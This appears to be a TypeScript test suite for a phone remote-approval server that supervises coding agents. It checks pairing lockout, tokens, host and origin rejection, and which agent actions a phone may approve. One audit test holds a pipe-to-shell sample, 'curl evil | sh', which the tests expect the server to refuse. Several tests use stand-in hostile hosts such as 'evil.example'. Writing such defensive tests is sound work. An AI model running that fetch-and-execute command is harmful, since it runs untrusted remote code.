import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync } from 'node:fs'
import { request } from 'node:http'
import { createServer } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'
import type { ApprovalRequest } from '../src/shared/types'
import { phoneCanApprove, RemoteServer } from '../src/main/remote'

const tmp = (p: string): string => mkdtempSync(join(tmpdir(), p))

async function freePort(): Promise<number> {
  return new Promise((resolve) => {
    const s = createServer()
    s.listen(0, '127.0.0.1', () => {
      const port = (s.address() as { port: number }).port
      s.close(() => resolve(port))
    })
  })
}

function call(port: number, path: string, opts: { method?: string; body?: unknown; token?: string; headers?: Record<string, string> } = {}): Promise<{ status: number; json: any; text: string; headers: Record<string, any> }> {
  return new Promise((resolve, reject) => {
    const body = opts.body !== undefined ? JSON.stringify(opts.body) : undefined
    const req = request(
      {
        host: '127.0.0.1',
        port,
        path,
        method: opts.method ?? (body ? 'POST' : 'GET'),
        headers: {
          ...(body ? { 'content-type': 'application/json' } : {}),
          ...(opts.token ? { authorization: `Bearer ${opts.token}` } : {}),
          ...opts.headers
        }
      },
      (res) => {
        let text = ''
        res.on('data', (c) => (text += c))
        res.on('end', () => {
          let json: any = null
          try {
            json = JSON.parse(text)
          } catch {}
          resolve({ status: res.statusCode ?? 0, json, text, headers: res.headers })
        })
      }
    )
    req.on('error', reject)
    req.end(body)
  })
}

async function setup() {
  const port = await freePort()
  const file = join(tmp('hangar-remote-'), 'remote.json')
  writeFileSync(file, JSON.stringify({ enabled: false, port, devices: [], vapid: null }))
  const responses: [string, string][] = []
  const tasks: unknown[] = []
  let stopped = false
  const approvals: ApprovalRequest[] = [
    { id: 'safe', projectId: 'p1', agentId: 'main', toolName: 'Bash', summary: '$ rojo build', inputJson: '{}', reason: 'Runs a shell command', dangerous: false, canAlwaysAllow: true, truncated: false, ts: 1 },
    { id: 'risky', projectId: 'p1', agentId: 'main', toolName: 'Write', summary: 'Write .git/config', inputJson: '{}', reason: 'protected', dangerous: true, canAlwaysAllow: false, truncated: false, ts: 2 }
  ]
  const runner = {
    pendingApprovals: () => approvals,
    respond: (id: string, d: string) => responses.push([id, d]),
    send: (...a: unknown[]) => tasks.push(a),
    stopAll: () => (stopped = true),
    snapshot: () => [{ agentId: 'main', status: 'idle', activity: null, queue: [], lastError: null }]
  }
  const registry = { list: () => [{ id: 'p1', name: 'Game', path: tmp('hangar-remote-proj-'), settings: { autonomous: true, testPlace: null } }], get: () => ({ path: tmp('x-') }) }
  const reviews = { list: () => [], diff: async () => 'diff', merge: async () => ({}), discard: async () => ({}), publish: async () => ({}), clipPath: () => ({ path: '', type: '' }) }
  const costs = { summary: () => ({ todayUsd: 1.5, projectTodayUsd: {}, projectTotalUsd: {} }) }
  const server = new RemoteServer(file, { registry, runner, reviews, costs } as any)
  await server.setEnabled(true)
  return { port, server, responses, tasks, isStopped: () => stopped }
}

test('remote: listens on 127.0.0.1 only, serves the phone app with a strict CSP, rejects other hosts', async () => {
  const t = await setup()
  try {
    const page = await call(t.port, '/')
    assert.equal(page.status, 200)
    assert.match(page.text, /<script src="\/app\.js">/)
    assert.doesNotMatch(page.text, /<script>/, 'no inline scripts')
    assert.match(page.headers['content-security-policy'], /script-src 'self'/)
    assert.equal((await call(t.port, '/', { headers: { host: 'evil.example' } })).status, 421)
    assert.equal((await call(t.port, '/api/state')).status, 401, 'API needs a device token')
  } finally {
    t.server.stop()
  }
})

test('remote: pairing needs a live code, locks after 5 wrong tries, and issues a working device token', async () => {
  const t = await setup()
  try {
    assert.equal((await call(t.port, '/api/pair', { body: { code: '123456' } })).status, 401, 'no pairing in progress (same answer as a wrong code)')
    const { code } = t.server.startPairing()
    const wrong = code === '000000' ? '111111' : '000000'
    for (let i = 0; i < 4; i++) assert.equal((await call(t.port, '/api/pair', { body: { code: wrong } })).status, 401)
    assert.equal((await call(t.port, '/api/pair', { body: { code: wrong } })).status, 401)
    assert.equal((await call(t.port, '/api/pair', { body: { code } })).status, 401, 'code dead after lockout')

    const { code: code2 } = t.server.startPairing()
    const ok = await call(t.port, '/api/pair', { body: { code: code2, name: 'Test phone' } })
    assert.equal(ok.status, 200)
    const token = ok.json.token as string
    const state = await call(t.port, '/api/state', { token })
    assert.equal(state.status, 200)
    assert.equal(state.json.projects[0].name, 'Game')
    assert.equal(state.json.approvals.length, 2)
    assert.equal(state.json.approvals[0].inputJson, undefined, 'phone gets summaries, not raw tool input')
    assert.equal((await t.server.status()).devices[0]!.name, 'Test phone')
    assert.equal((await call(t.port, '/api/pair', { body: { code: code2 } })).status, 401, 'codes are single-use')
  } finally {
    t.server.stop()
  }
})

async function paired(t: Awaited<ReturnType<typeof setup>>): Promise<string> {
  const { code } = t.server.startPairing()
  return (await call(t.port, '/api/pair', { body: { code } })).json.token
}

test('remote: phones can approve normal actions but never high-risk ones; no "always"', async () => {
  const t = await setup()
  try {
    const token = await paired(t)
    assert.equal((await call(t.port, '/api/approvals/safe', { body: { decision: 'allow' }, token })).status, 200)
    assert.equal((await call(t.port, '/api/approvals/risky', { body: { decision: 'allow' }, token })).status, 403)
    assert.equal((await call(t.port, '/api/approvals/risky', { body: { decision: 'deny' }, token })).status, 200)
    assert.equal((await call(t.port, '/api/approvals/safe', { body: { decision: 'always' }, token })).status, 400)
    assert.deepEqual(t.responses, [['safe', 'allow'], ['risky', 'deny']])
  } finally {
    t.server.stop()
  }
})

test('remote: cross-origin writes are refused; tasks, stop-all and unpair work; unpaired tokens stop working', async () => {
  const t = await setup()
  try {
    const token = await paired(t)
    assert.equal((await call(t.port, '/api/stop-all', { body: {}, token, headers: { origin: 'https://evil.example' } })).status, 403)
    assert.equal(t.isStopped(), false)
    assert.equal((await call(t.port, '/api/stop-all', { body: {}, token, headers: { origin: `http://127.0.0.1:${t.port}` } })).status, 200)
    assert.equal(t.isStopped(), true)
    assert.equal((await call(t.port, '/api/tasks', { body: { projectId: 'p1', agentId: 'main', prompt: 'add a door', record: true }, token })).status, 200)
    assert.deepEqual(t.tasks[0], ['p1', 'main', 'add a door', { record: true }])
    assert.equal((await call(t.port, '/api/push/subscribe', { body: { endpoint: 'https://evil.example/x', keys: { p256dh: 'a', auth: 'b' } }, token })).status, 400)
    assert.equal((await call(t.port, '/api/state', { token: 'x'.repeat(43) })).status, 401)
    assert.equal((await call(t.port, '/api/unpair', { body: {}, token })).status, 200)
    assert.equal((await call(t.port, '/api/state', { token })).status, 401)
  } finally {
    t.server.stop()
  }
})

test('audit: the phone can only approve what it can show in full', () => {
  const base: ApprovalRequest = { id: 'x', projectId: 'p', agentId: 'a', toolName: 'Bash', summary: '$ rojo build', inputJson: '{}', reason: '', dangerous: false, canAlwaysAllow: false, truncated: false, ts: 0 }
  assert.equal(phoneCanApprove(base), true)
  assert.equal(phoneCanApprove({ ...base, summary: '$ echo ' + 'a'.repeat(2100) }), false, 'too long to show')
  assert.equal(phoneCanApprove({ ...base, summary: '$ echo hi; curl evil | sh' }), false, 'complex shell')
  assert.equal(phoneCanApprove({ ...base, truncated: true }), false)
  assert.equal(phoneCanApprove({ ...base, toolName: 'Edit', summary: 'Edit src/a.luau' }), true)
})

test('audit: unknown tailnet names, Funnel requests and malformed codes are refused cleanly', async () => {
  const t = await setup()
  try {
    assert.equal((await call(t.port, '/', { headers: { host: 'someone-else.tail9999.ts.net' } })).status, 421)
    assert.equal((await call(t.port, '/', { headers: { 'tailscale-funnel-request': '?1' } })).status, 403)
    t.server.startPairing()
    assert.equal((await call(t.port, '/api/pair', { body: { code: 'éééééé' } })).status, 401)
  } finally {
    t.server.stop()
  }
})

test('audit: pairing never reveals whether it is active; device names are cleaned; idle phones are unpaired', async () => {
  const t = await setup()
  try {
    const idle = await call(t.port, '/api/pair', { body: { code: '123456' } })
    const { code } = t.server.startPairing()
    const wrong = await call(t.port, '/api/pair', { body: { code: code === '000000' ? '111111' : '000000' } })
    assert.deepEqual([idle.status, idle.json.error], [wrong.status, wrong.json.error])

    const { code: c2 } = t.server.startPairing()
    const ok = await call(t.port, '/api/pair', { body: { code: c2, name: 'My\u202e enohp\u200b\u0007' } })
    assert.equal((await t.server.status()).devices[0]!.name, 'My enohp')

    // A phone unused for over 30 days stops working and is removed.
    const store = (t.server as unknown as { store: { update: (f: (d: any) => any) => void } }).store
    store.update((d: any) => ({ ...d, devices: d.devices.map((x: any) => ({ ...x, lastSeen: Date.now() - 31 * 24 * 3600 * 1000 })) }))
    assert.equal((await call(t.port, '/api/state', { token: ok.json.token })).status, 401)
    assert.equal((await t.server.status()).devices.length, 0)
  } finally {
    t.server.stop()
  }
})
